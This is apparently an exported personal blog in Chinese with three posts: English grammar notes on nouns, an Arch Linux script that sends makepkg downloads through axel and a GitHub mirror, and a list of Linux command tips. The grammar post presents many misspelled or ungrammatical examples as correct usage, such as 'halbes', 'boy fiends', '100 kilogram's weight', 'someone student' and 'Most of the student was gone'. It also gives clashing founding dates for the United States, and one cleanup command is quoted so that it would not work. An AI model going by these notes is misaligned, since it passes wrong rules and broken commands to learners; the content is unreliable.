<p><code>water</code>、<code>fire</code>、<code>time</code>、<code>hope</code>、<code>knowledge</code>、<code>intelligence</code>等</p>
</li>
</ul>
<h2 id="具体名词、抽象名词"><a href="#具体名词、抽象名词" class="headerlink" title="具体名词、抽象名词"></a>具体名词、抽象名词</h2><ul>
<li><p>具体名词(看得见摸得着，可数不可数都有)</p>
<p><code>man</code>、<code>Beijing</code>、<code>book</code>、<code>car</code>、<code>water</code>、<code>fire</code>等</p>
</li>
<li><p>抽象名词(无形的各种事物，大多数是不可数)</p>
<p><code>time</code>、<code>hope</code>、<code>knowledge</code>、<code>love</code>、<code>anger</code>等</p>
</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li>可数名词<strong><font color="#ff0000">能</font></strong>计数</li>
<li>可数名词<strong><font color="#ff0000">能</font></strong>加不定冠词 (a/an) 和数词 (one、two等)</li>
<li><p>可数名词<strong><font color="#ff0000">可以</font></strong>加定冠词 (the)</p>
</li>
<li><p>不可数名词<strong><font color="#ff0000">不能</font></strong>计数</p>
</li>
<li>不可数名词<strong><font color="#ff0000">不能</font></strong>加不定冠词 (a/an) 和数词 (one、two)</li>
<li>不可数名词<em>可以</em>加定冠词 (the)</li>
</ul>
<h2 id="名词单复数变化"><a href="#名词单复数变化" class="headerlink" title="名词单复数变化"></a>名词单复数变化</h2><h3 id="规则变化"><a href="#规则变化" class="headerlink" title="规则变化"></a>规则变化</h3><ul>
<li><p>大多数名词，直接加<code>s</code><br><code>day</code> ==&gt; <code>days</code></p>
</li>
<li><p>以<code>o</code>、<code>s</code>、<code>x</code>、<code>ch</code>、<code>sh</code>结尾的加<code>es</code><br><code>hero</code> ==&gt; <code>heroes</code></p>
</li>
<li><p>辅音+<code>y</code>，变<code>y</code>为<code>i</code>加<code>es</code><br><code>city</code> ==&gt; <code>cities</code></p>
</li>
<li><p>元音 <strong>+</strong> <code>y</code>，加<code>s</code><br><code>boy</code> ==&gt; <code>boys</code></p>
</li>
<li><p><code>f</code>或<code>fe</code>结尾，变<code>f</code>为<code>v</code>加<code>es</code> 或直接加<code>s</code><br><code>half</code> ==&gt; <code>halbes</code> ; <code>roof</code> ==&gt; <code>roofs</code></p>
</li>
<li><p><code>ch</code>结尾发<code>/k/</code>,直接加<code>s</code><br><code>stomach</code> ==&gt; <code>stomachs</code></p>
</li>
<li><p>辅音 <strong>+</strong> <code>oo</code>结尾加<code>s</code><br><code>bamboo</code> ==&gt; <code>bamboos</code></p>
</li>
<li><p>辅音 <strong>+</strong> <code>o</code>，加<code>es</code><br><code>echo</code> ==&gt; <code>echoes</code></p>
</li>
<li><p><code>volcano</code>、<code>mango</code>、<code>banjo</code>、<code>grotto</code>、<code>halo</code>、<code>archipelago</code> 加<code>es</code>和<code>s</code>都可以</p>
</li>
</ul>
<h3 id="不规则变化"><a href="#不规则变化" class="headerlink" title="不规则变化"></a>不规则变化</h3><p>常见：<br><code>man</code> ==&gt; <code>men</code><br><code>woman</code> ==&gt; <code>women</code><br><code>goose</code> ==&gt; <code>geese</code><br><code>foot</code> ==&gt; <code>feet</code><br><code>tooth</code> ==&gt; <code>teeth</code><br><code>child</code> ==&gt; <code>children</code><br><code>mouse</code> ==&gt; <code>mice</code><br><code>fish</code> ==&gt; <code>fish</code><br><code>sheep</code> ==&gt; <code>sheep</code><br><code>deer</code> ==&gt; <code>deer</code></p>
<h3 id="一直是复数的"><a href="#一直是复数的" class="headerlink" title="一直是复数的"></a>一直是复数的</h3><p><code>scissors</code> (剪刀)<br><code>tweezers</code> (镊子)<br><code>glasses</code> (眼镜)<br><code>congratulations</code> (祝贺)<br><code>clothes</code> (衣服)<br><code>trousers</code> (裤子)<br><code>amends</code> (赔偿)<br><code>shenanigans</code> (恶作剧)<br><code>cahoots</code> (同伙)<br><code>smithereens</code> (碎片)</p>
<h3 id="复合名词-两名词合在一起"><a href="#复合名词-两名词合在一起" class="headerlink" title="复合名词 (两名词合在一起)"></a>复合名词 (两名词合在一起)</h3><ul>
<li><p>不可数名词结尾，无复数形式<br><code>homework</code>、<code>nwespaper</code>、<code>greenhouse</code></p>
</li>
<li><p><code>man</code>或<code>woman</code>做前缀，前后都变复数<br><code>man actor</code> ==&gt; <code>men actors</code></p>
</li>
<li><p>两个名词，后面变复数<br><code>boy friend</code> ==&gt; <code>boy fiends</code></p>
</li>
<li><p>可数名词 <strong>+</strong> 介词(短语) ，前面名词复数<br><code>sister in law</code> ==&gt; <code>sisters in law</code></p>
</li>
<li><p>动词/过去分词 <strong>+</strong> 副词，加<code>s</code><br><code>stand by</code> ==&gt; <code>stand bys</code></p>
</li>
</ul>
<h2 id="名词所有格"><a href="#名词所有格" class="headerlink" title="名词所有格"></a>名词所有格</h2><h3 id="39-s所有格，中英-语序一样"><a href="#39-s所有格，中英-语序一样" class="headerlink" title="&#39;s所有格，中英 语序一样"></a><code>&#39;s</code>所有格，中英 语序一样</h3><ul>
<li><p>单数名词/复数名词非<code>s</code>结尾，后加<code>&#39;s</code>，单数名词<code>s</code>结尾，后加<code>&#39;s</code><br>Jack’s (杰克的)<br>The boss’s car (老板的车)</p>
</li>
<li><p>复数名词<code>s</code>结尾，后加<code>&#39;</code><br><code>Boys&#39;</code> (男孩的)</p>
</li>
<li><p>用<code>and</code>连接并列名词时</p>
<ul>
<li>表示各自所有关系，分别加<code>&#39;s</code></li>
<li>共同所有关系，只在最后一个名词加<code>&#39;s</code><br>Tom’s and Jack’ rooms (汤姆的房间和杰克的房间)<br>Tom and Jack’s room (汤姆和杰克的房间)</li>
</ul>
</li>
<li><p>其他常见用法</p>
<ul>
<li><p>日程时间后<br><code>3 day&#39; holiday</code> (3天的假期)</p>
</li>
<li><p>国家城市后<br><code>Beijing&#39;s policy</code> (北京的政策)</p>
</li>
<li><p>地方机构后<br><code>The airport&#39;s service guide&#39;</code> (机场的服务指南)</p>
</li>
<li><p>各种单位后<br><code>100 kilogram&#39;s weight</code> (100千克的重量)</p>
</li>
<li><p>天体后<br><code>The Jupiter&#39;s aura</code> (木星的光环)</p>
</li>
</ul>
</li>
</ul>
<h3 id="of所有格，中英-语序相反"><a href="#of所有格，中英-语序相反" class="headerlink" title="of所有格，中英 语序相反"></a><code>of</code>所有格，中英 语序相反</h3><p>  修饰前面的名词，表两个名词间的所属关系<br>  <code>The content of the book</code> = <code>The book&#39;s content</code> (这本书的内容)</p>
<h3 id="s-of双重所有格"><a href="#s-of双重所有格" class="headerlink" title="s+of双重所有格"></a><code>s</code>+<code>of</code>双重所有格</h3><ul>
<li><p><code>of</code> <strong>+</strong> 名词<code>&#39;s</code>所有格<br><code>This is a photo of my cat&#39;s</code> (这是我猫的照片)</p>
</li>
<li><p><code>of</code> <strong>+</strong> 名词性物主代词<br><code>He is a friend of mine</code> (他是我的朋友)</p>
</li>
</ul>
<h2 id="名词主谓一致"><a href="#名词主谓一致" class="headerlink" title="名词主谓一致"></a>名词主谓一致</h2><p>  主谓一致：主语的单复数和谓语的单复数保持一致</p>
<p>  <code>I(单) am(单) student.</code> (我是学生)</p>
<p>  <code>They(复) are(复) students</code> (他们是学生)</p>
<ul>
<li><p>国家、机构、书名等专有名词的复数形式看作整体，谓语用单数</p>
<p><code>The United States was founded in 1775</code> (美国建立与1776年)</p>
<p><code>&quot;Three Kingdoms&quot; is a good story</code> (三国演义是一个好故事)</p>
</li>
<li><p><code>many a ...</code> 或 <code>more than one</code> <strong>+</strong> 名词做主语，谓语用单数</p>
<p><code>Many a man is smoking</code> (很多男人在吸烟)</p>
<p><code>More than one man is smoking</code> (不止一个男人在吸烟)</p>
</li>
<li><p><code>one and a half</code> <strong>+</strong> 复数名词做主语，谓语用单数</p>
<p><code>One and a half watermelons is in the fridge</code> (冰箱里有一个半西瓜)</p>
</li>
<li><p>时间、钱、距离、等各种单位看做整体，谓语用单数</p>
<p><code>Two dollars is no big deal</code> (两美元没什么大不了)</p>
<p><code>Four miles isnot along way</code> (四英里的路不远)</p>
</li>
<li><p>加减乘除运算中，谓语用单数</p>
<p><code>Five times five is twenty-five</code> (5乘5是25)</p>
<p><code>one plus one is two</code> (1加1是2)</p>
</li>
<li><p><code>each</code>、<code>one</code>、<code>no one</code>、<code>some(any,no,every)</code> <strong>+</strong> <code>body(one,thing)</code> 作主语或作限定词(限定在一个范围内了)，谓语用单数</p>
<p><code>Each student is in the classroom</code> (每个学生都在教室里)</p>
<p><code>someone student is in the classroom</code> (某个学生在教室里)</p>
</li>
<li><p><code>one</code> <strong>+</strong> of <strong>+</strong> 复数名词结构中，谓语用单数</p>
<p><code>One of the students in our school is from the United States</code> (我们学校有一名来自美国的学生)</p>
</li>
<li><p>含有集体概念的名词，根据上下问判断，整体概念谓语用单数，个体概念谓语用复数</p>
<p><code>The fmaily was in a poor way</code>(这是一个家庭生活)</p>
<p><code>The family goes to the movies together</code> (这家人一起去看电影(个体概念，这一家的人))</p>
</li>
</ul>
<ul>
<li><p>连词相关</p>
<ul>
<li><code>and</code> 或 <code>both...and...</code> 连接两个单数名词做主语，代表复数的概念，大多数情况谓语用复数</li>
</ul>
<p><code>He and him families are at the funeral</code> (他和他的家人在参加葬礼)</p>
<p><code>Bath China ad the United States are big countries</code> (中国和美国都是大国)</p>
<ul>
<li><code>adn</code> 连接两个单数词，指同一人同一物或同一概念，两个名词共用一个冠词，谓语动词用单数</li>
</ul>
<p><code>The YouTuber and traveler is he friend</code> (这位旅行家兼YouTube视频博主是他的朋友)</p>
<ul>
<li><code>and</code> 连接两个单数词，主语前有 <code>every</code>、<code>each</code>、<code>no</code>、<code>many a</code> 修饰时，谓语用单数</li>
</ul>
<p><code>Each day and night is busy</code> (每天都从早忙到晚)</p>
</li>
<li><p>不定冠词<code>a/an</code> <strong>+</strong> 单数名词 <strong>+</strong> or two做主语，谓语用单数</p>
<p><code>An apple or two is not enough</code> (一两个苹果是不够的)</p>
</li>
<li><p><code>one or two</code> <strong>+</strong> 复数名词做主语，谓语用复数</p>
<p><code>One or two apples are not enough</code> (一两个苹果是不够的)</p>
</li>
</ul>
<ul>
<li><p><code>some of</code>、<code>plenty of</code>、<code>a lot of</code>、<code>lots of</code>、<code>most of</code>、<code>the rest of</code>、<code>all of</code>、<code>half of</code>、<code>part of</code>、分数/百分百 + of + 名词短语，作主语；谓语动词与<code>of</code>后的名词，保持单复数一致</p>
<p><code>Most of the student was gone</code> (大多数学生都走了)</p>
<p><code>Most of the students were gone</code> (大多数学生都走了)</p>
</li>
<li><p><code>few</code>、<code>many</code>、<code>several</code>、<code>all</code>、<code>some</code>后加名词做主语，谓语用复数</p>
<p><code>The few words are difficult</code> (这几句话好难)</p>
</li>
<li><p>就近原则 (距离谓语近的名词，决定谓语单复数)</p>
<ul>
<li>There be/Here be</li>
</ul>
<p><code>There is one computer and two phones</code> (那有一台电脑和两台手机)</p>
<p><code>There are two computers and one phone</code> (那有两台电脑和一台手机)</p>
<p><code>Here is one apple and two bananas</code> (那有一个苹果和两个香蕉)</p>
<p><code>Here are two apples and one banana</code> (那有两个苹果和一个香蕉)</p>
<ul>
<li>or、either…or…(二选一)、neither…nor…(两个都不选，选另外一个)、not only…but…(also)(不经而且，两者都)连接并列作主语</li>
</ul>
<p><code>His friends or he was dead</code> (他的朋友们或者他已经死了)</p>
<p><code>He or his friends were dead</code> (他或者他的朋友们已经死了)</p>
<p><code>Either my brothers or mother is goning to the garden</code> (我弟弟或者妈妈要去花园)</p>
<p><code>Either mother or my brothers are going to the garden</code> (妈妈或者我弟弟要去花园)</p>
<p><code>Neither two apples nor one banana is vegetable</code> (两苹果和一个香蕉都不是蔬菜)</p>
<p><code>Neither one apple nor two bananas are vegetables</code> (一个苹果和两个香蕉都不是蔬菜)</p>
<p><code>Not only my friends but also my girlfriend was wrong</code> (不仅是我朋友，我女朋友也错了)</p>
<p><code>Not only my girlfriend but also my friends were wrong</code> (不仅是我女朋友，我朋友也错了)</p>
<ul>
<li>四除(<code>but</code>、<code>except</code>、<code>besides</code>、<code>in addition to</code>) 五和 (<code>with</code>、<code>along with</code>、<code>together with</code>、<code>combined with</code>、<code>as well as</code>) 包括(<code>including</code>) 而不是(<code>rather than</code>、<code>instead of</code>)</li>
</ul>
<p><code>Peter,but his roommates,is friendly.</code> (皮特人很好，除了他室友)</p>
<p><code>Peter,except his roommates,is friendly.</code> (皮特人很好，除了他室友)</p>
<p><code>Peter,besides his roommates.is friendly.</code> (皮特人很好，除了他室友)</p>
<p><code>Peter,in addition to his roommates,is friendly.</code> (皮特人很好，除了他室友)</p>
<p><code>Peter,with his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,along with his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,together with his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,combined with his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,as well as his roommates,is friendly.</code> (皮特和他室友都很好)</p>
<p><code>Peter,including his roommates,is friendly.</code> (皮特人很好，包括他室友也很好)</p>
<p><code>Peter,rather than his roommates,is friendly.</code> (皮特人很好而不是他室友)</p>
<p><code>Peter,instead of his roommatesmis friendly.</code> (皮特人很好而不是他室友)</p>
</li>
</ul>
]]></content>
      <categories>
        <category>英语</category>
      </categories>
      <tags>
        <tag>英语</tag>
        <tag>语法</tag>
      </tags>
  </entry>
  <entry>
    <title>解决arch安装AUR软件时github下载软件包慢或不可获得的问题</title>
    <url>/2020/12/03/%E8%A7%A3%E5%86%B3arch%E5%AE%89%E8%A3%85AUR%E8%BD%AF%E4%BB%B6%E6%97%B6github%E4%B8%8B%E8%BD%BD%E8%BD%AF%E4%BB%B6%E5%8C%85%E6%85%A2%E6%88%96%E4%B8%8D%E5%8F%AF%E8%8E%B7%E5%BE%97%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>github的release，噩梦一般。当AUR里面调用缺省的curl去对付那些包的时候，90%的情况是无法成功的。即便成功也是苦等几十分钟。至少我的网络环境是这样。</p>
<p><code>/etc/makepkg.conf</code> ： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-- The download utilities that makepkg should use to acquire sources</span><br><span class="line">#  Format: &#39;protocol::agent&#39;</span><br><span class="line">DLAGENTS&#x3D;(&#39;file::&#x2F;usr&#x2F;bin&#x2F;curl -gqC - -o %o %u&#39;</span><br><span class="line">          &#39;ftp::&#x2F;usr&#x2F;bin&#x2F;curl -gqfC - --ftp-pasv --retry 3 --retry-delay 3 -o %o %u&#39;</span><br><span class="line">          &#39;http::&#x2F;usr&#x2F;bin&#x2F;curl -gqb &quot;&quot; -fLC - --retry 3 --retry-delay 3 -o %o %u&#39;</span><br><span class="line">          &#39;https::&#x2F;usr&#x2F;bin&#x2F;curl -gqb &quot;&quot; -fLC - --retry 3 --retry-delay 3 -o %o %u&#39;</span><br><span class="line">          &#39;rsync::&#x2F;usr&#x2F;bin&#x2F;rsync --no-motd -z %u %o&#39;</span><br><span class="line">          &#39;scp::&#x2F;usr&#x2F;bin&#x2F;scp -C %u %o&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>吧curl换成了axel</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DLAGENTS&#x3D;(&#39;file::&#x2F;usr&#x2F;bin&#x2F;curl -gqC - -o %o %u&#39;</span><br><span class="line">          &#39;ftp::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;http::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;https::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;rsync::&#x2F;usr&#x2F;bin&#x2F;rsync --no-motd -z %u %o&#39;</span><br><span class="line">          &#39;scp::&#x2F;usr&#x2F;bin&#x2F;scp -C %u %o&#39;)</span><br></pre></td></tr></table></figure>
<p>但github不管多少线程都跑不动，改用镜像站下载</p>
<p>github镜像站：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com.cnpmjs.org</span><br><span class="line">https:&#x2F;&#x2F;hub.fastgit.org</span><br></pre></td></tr></table></figure><br>参考: <a href="https://www.cnblogs.com/seniortestingdev/p/13393785.html">让你的GitHub下载飞速提升到2M/s以上</a></p>
<p>通过脚本换链接：</p>
<p><code>axel_for_makepkg.sh</code> :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># 该脚本用于处理yay安装软件时，由github下载缓慢甚至无法下载的问题</span></span><br><span class="line"><span class="comment"># 检测域名是不是github，如果是，则替换为镜像网站</span></span><br><span class="line"><span class="comment"># 采用axel代替curl进行10线程下载</span></span><br><span class="line"><span class="comment"># 实验用链接：</span></span><br><span class="line"><span class="comment"># https://download.fastgit.org/beekeeper-studio/beekeeper-studio/releases/download/v1.6.11/beekeeper-studio_1.6.11_amd64.deb</span></span><br><span class="line"><span class="comment"># https://github.com/beekeeper-studio/beekeeper-studio/releases/download/v1.6.11/beekeeper-studio_1.6.11_amd64.deb</span></span><br><span class="line"></span><br><span class="line">domin=`<span class="built_in">echo</span> <span class="variable">$2</span> | cut -f3 -d<span class="string">&#x27;/&#x27;</span>`;</span><br><span class="line">others=`<span class="built_in">echo</span> <span class="variable">$2</span> | cut -f4- -d<span class="string">&#x27;/&#x27;</span>`;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$domin</span>&quot;</span> <span class="keyword">in</span> </span><br><span class="line">    <span class="string">&quot;github.com&quot;</span>)</span><br><span class="line">    url=<span class="string">&quot;https://download.fastgit.org/&quot;</span><span class="variable">$others</span>;</span><br><span class="line">    ;;</span><br><span class="line">    *)</span><br><span class="line">    url=<span class="variable">$2</span>;</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;download from <span class="variable">$url</span>&quot;</span>;</span><br><span class="line">/usr/bin/axel -n 10 -a -o <span class="variable">$1</span> <span class="variable">$url</span>;</span><br></pre></td></tr></table></figure>
<p>修改<code>/etc/makepkg.conf</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DLAGENTS&#x3D;(&#39;file::&#x2F;usr&#x2F;bin&#x2F;curl -gqC - -o %o %u&#39;</span><br><span class="line">          &#39;ftp::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;http::&#x2F;usr&#x2F;bin&#x2F;axel -n 15 -a -o %o %u&#39;</span><br><span class="line">          &#39;https::~&#x2F;meshell&#x2F;fake_download_tools&#x2F;fake_axel_for_makepkg %o %u&#39;</span><br><span class="line">          &#39;rsync::&#x2F;usr&#x2F;bin&#x2F;rsync --no-motd -z %u %o&#39;</span><br><span class="line">          &#39;scp::&#x2F;usr&#x2F;bin&#x2F;scp -C %u %o&#39;)</span><br></pre></td></tr></table></figure>
<p>镜像不允许多线程下载哈哈，然而没关系，axel自动fallback成单线程</p>
<p>参考: <a href="https://zhuanlan.zhihu.com/p/176987140">机智的解决arch/manjaro安装AUR软件时github下载软件包慢或不可获得的问题</a></p>
]]></content>
      <tags>
        <tag>Arch</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>超好用的Linux命令</title>
    <url>/2019/10/20/%E8%B6%85%E5%A5%BD%E7%94%A8%E7%9A%84Linux%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="删除一个大文件"><a href="#删除一个大文件" class="headerlink" title="删除一个大文件"></a>删除一个大文件</h1><p>有一个很大的200GB的日志文件需要删除。rm和ls命令崩溃，可能是由于巨大的磁盘IO造成的，要删除这个大文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &#x2F;path&#x2F;to&#x2F;file.log </span><br><span class="line"># 或 </span><br><span class="line">: &gt; &#x2F;path&#x2F;to&#x2F;file.log </span><br><span class="line"># 然后删除</span><br><span class="line">rm &#x2F;path&#x2F;to&#x2F;file.log </span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="如何记录终端输出？"><a href="#如何记录终端输出？" class="headerlink" title="如何记录终端输出？"></a>如何记录终端输出？</h1><p>使用script命令行工具来为终端输出创建记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">script my.terminal.sessio </span><br></pre></td></tr></table></figure>
<p>输入命令测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls </span><br><span class="line">date</span><br><span class="line">sudo service foo stop </span><br></pre></td></tr></table></figure>
<p>结束script会话，输入  <code>exit</code>  或者 logout 或者按下 <code>Ctrl-D</code></p>
<p>浏览记录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more my.terminal.session </span><br><span class="line">less my.terminal.session </span><br><span class="line">cat my.terminal.session </span><br></pre></td></tr></table></figure></p>
<h1 id="还原被删除的-tmp-文件夹"><a href="#还原被删除的-tmp-文件夹" class="headerlink" title="还原被删除的 /tmp 文件夹"></a>还原被删除的 /tmp 文件夹</h1><p>恢复意外地删除了/tmp文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp </span><br><span class="line">chmod 1777 &#x2F;tmp </span><br><span class="line">chown root:root &#x2F;tmp </span><br><span class="line">ls -ld &#x2F;tmp </span><br></pre></td></tr></table></figure>
<h1 id="锁定一个文件夹"><a href="#锁定一个文件夹" class="headerlink" title="锁定一个文件夹"></a>锁定一个文件夹</h1><p>为文件夹<code>/downloads</code> 添加锁定保护</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 0000 &#x2F;downloads </span><br></pre></td></tr></table></figure>
<p>root用户仍旧可以访问，而ls和cd命令则不能用，需要还原使用以下命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 0755 &#x2F;downloads </span><br></pre></td></tr></table></figure></p>
<h1 id="在vim中用密码保护文件"><a href="#在vim中用密码保护文件" class="headerlink" title="在vim中用密码保护文件"></a>在vim中用密码保护文件</h1><p>用vim通过密码保护文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim +X filename </span><br></pre></td></tr></table></figure><br>或者在退出vim前使用 <code>:X</code>  加密文件，vim会提示输入一个密码</p>
<h1 id="清除屏幕上的乱码"><a href="#清除屏幕上的乱码" class="headerlink" title="清除屏幕上的乱码"></a>清除屏幕上的乱码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reset </span><br></pre></td></tr></table></figure>
<h1 id="易读格式"><a href="#易读格式" class="headerlink" title="易读格式"></a>易读格式</h1><p>传递-h或者-H（和其他选项）选项给GNU或者BSD工具来获取像ls、df、du等命令以易读的格式输出：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -lh </span><br><span class="line"></span><br><span class="line"># 以易读的格式 (比如： 1K 234M 2G) </span><br><span class="line">df -h </span><br><span class="line">df -k </span><br><span class="line"></span><br><span class="line"># 以字节、KB、MB 或 GB 输出：  </span><br><span class="line">free -b </span><br><span class="line">free -k </span><br><span class="line">free -m </span><br><span class="line">free -g </span><br><span class="line"></span><br><span class="line"># 以易读的格式输出 (比如 1K 234M 2G) </span><br><span class="line">du -h </span><br><span class="line"></span><br><span class="line"># 以易读的格式显示文件系统权限 </span><br><span class="line">stat -c %A &#x2F;boot </span><br><span class="line"></span><br><span class="line"># 比较易读的数字 </span><br><span class="line">sort -h -a file </span><br><span class="line"></span><br><span class="line"># 在Linux上以易读的形式显示cpu信息 </span><br><span class="line">lscpu </span><br><span class="line">lscpu -e </span><br><span class="line">lscpu -e&#x3D;cpu,node </span><br><span class="line"></span><br><span class="line"># 以易读的形式显示每个文件的大小 </span><br><span class="line">tree -h </span><br><span class="line">tree -h &#x2F;boot </span><br></pre></td></tr></table></figure></p>
<h1 id="在Linux系统中显示已知的用户信息"><a href="#在Linux系统中显示已知的用户信息" class="headerlink" title="在Linux系统中显示已知的用户信息"></a>在Linux系统中显示已知的用户信息</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># linux 版本 </span><br><span class="line">lslogins </span><br><span class="line"></span><br><span class="line">#BSD 版本 </span><br><span class="line">logins </span><br></pre></td></tr></table></figure>
<h1 id="删除意外在当前文件夹下解压的文件"><a href="#删除意外在当前文件夹下解压的文件" class="headerlink" title="删除意外在当前文件夹下解压的文件"></a>删除意外在当前文件夹下解压的文件</h1><p>意外在<code>/var/www/html/</code>下解压了一个压缩包，使<code>/var/www/html</code>内变混乱，现在需要删除解压出来到文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F; </span><br><span class="line">rm -f &quot;$(tar ztf &#x2F;path&#x2F;to&#x2F;file.tar.gz)&quot; </span><br></pre></td></tr></table></figure></p>
<h1 id="对top命令的输出感到疑惑"><a href="#对top命令的输出感到疑惑" class="headerlink" title="对top命令的输出感到疑惑"></a>对top命令的输出感到疑惑</h1><p>用htop代替top：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo htop </span><br></pre></td></tr></table></figure></p>
<h1 id="想要再次运行相同的命令"><a href="#想要再次运行相同的命令" class="headerlink" title="想要再次运行相同的命令"></a>想要再次运行相同的命令</h1><p>只需要输入<code>!!</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;myhome&#x2F;dir&#x2F;script&#x2F;name arg1 arg2 </span><br><span class="line"></span><br><span class="line"># 要再次运行相同的命令  </span><br><span class="line"></span><br><span class="line">!! </span><br><span class="line"></span><br><span class="line"># 以root用户运行最后运行的命令 </span><br><span class="line"></span><br><span class="line">sudo !! </span><br></pre></td></tr></table></figure><br><code>!</code>会运行最近使用的命令。要运行最近运行的以 <code>foo</code> 开头命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!foo </span><br><span class="line"></span><br><span class="line"># 以root用户运行上一次以 service 开头的命令 </span><br><span class="line"></span><br><span class="line">sudo !service </span><br></pre></td></tr></table></figure><br><code>!$</code>用于运行带上最后一个参数的命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 编辑 nginx.conf </span><br><span class="line"></span><br><span class="line">sudo vi &#x2F;etc&#x2F;nginx&#x2F;nginx.conf </span><br><span class="line"></span><br><span class="line"># 测试 nginx.conf </span><br><span class="line"></span><br><span class="line">&#x2F;sbin&#x2F;nginx -t -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf </span><br><span class="line"></span><br><span class="line"># 测试完 &quot;&#x2F;sbin&#x2F;nginx -t -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf&quot;可以用vi再次编辑这个文件了 </span><br><span class="line"></span><br><span class="line">sudo vi !$ </span><br></pre></td></tr></table></figure></p>
<h1 id="在终端上提醒你必须得走了"><a href="#在终端上提醒你必须得走了" class="headerlink" title="在终端上提醒你必须得走了"></a>在终端上提醒你必须得走了</h1><p>需要提醒离开终端，输入下面的命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">leave +hhmm </span><br></pre></td></tr></table></figure></p>
<p><code>hhmm</code> : 时间是以hhmm的形式，hh表示小时（12时制或者24小时制），mm代表分钟。所有的时间都转化成12时制，并且假定发生在接下来的12小时。</p>
<h1 id="甜蜜的家"><a href="#甜蜜的家" class="headerlink" title="甜蜜的家"></a>甜蜜的家</h1><p>返回刚才都目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd - </span><br></pre></td></tr></table></figure><br>快速地回到家目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd </span><br></pre></td></tr></table></figure><br>变量CDPATH定义了目录的搜索路径：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export CDPATH&#x3D;&#x2F;var&#x2F;www:&#x2F;nas10 </span><br></pre></td></tr></table></figure><br>现在，不用输入<code>cd /var/www/html/</code> 这样长了，直接输入下面的命令进入 <code>/var/www/html</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd html </span><br></pre></td></tr></table></figure></p>
<h1 id="在less浏览时编辑文件"><a href="#在less浏览时编辑文件" class="headerlink" title="在less浏览时编辑文件"></a>在less浏览时编辑文件</h1><p>要编辑一个正在用<code>less</code>浏览的文件，可以按下<code>v</code> ,可以用变量$EDITOR所指定的编辑器来编辑<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">less *.c </span><br><span class="line"></span><br><span class="line">less foo.html </span><br><span class="line"></span><br><span class="line"># 按下v键来编辑文件</span><br><span class="line"># 退出编辑器后，你可以继续用less浏览</span><br></pre></td></tr></table></figure></p>
<h1 id="列出你系统中的所有文件和目录"><a href="#列出你系统中的所有文件和目录" class="headerlink" title="列出你系统中的所有文件和目录"></a>列出你系统中的所有文件和目录</h1><p>要看系统中的所有目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type d | less </span><br><span class="line"></span><br><span class="line"># 列出 $HOME 所有目录 </span><br><span class="line"></span><br><span class="line">find $HOME -type d -ls | less </span><br></pre></td></tr></table></figure><br>要看到所有的文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -type f | less </span><br><span class="line"></span><br><span class="line"># 列出 $HOME 中所有的文件 </span><br><span class="line"></span><br><span class="line">find $HOME -type f -ls | less </span><br></pre></td></tr></table></figure></p>
